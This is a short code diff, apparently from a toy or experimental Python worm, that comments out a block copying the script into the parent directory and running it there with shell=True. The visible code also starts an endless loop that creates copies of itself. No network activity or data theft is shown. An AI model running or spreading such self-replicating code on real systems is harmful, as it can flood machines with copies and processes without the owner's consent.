@@ -5,12 +5,12 @@ from random import seed, randint
 # Initialise random library
 seed()
 
-# Adopt worm1.py name
-try:
-    copy(__file__, "../")
-    run(("worm1.py"), shell=True, cwd="../")
-except Exception:
-    pass
+# # Adopt worm1.py name
+# try:
+#     copy(__file__, "../")
+#     run(("worm1.py"), shell=True, cwd="../")
+# except Exception:
+#     pass
 
 while True:
     # Create a version of itself
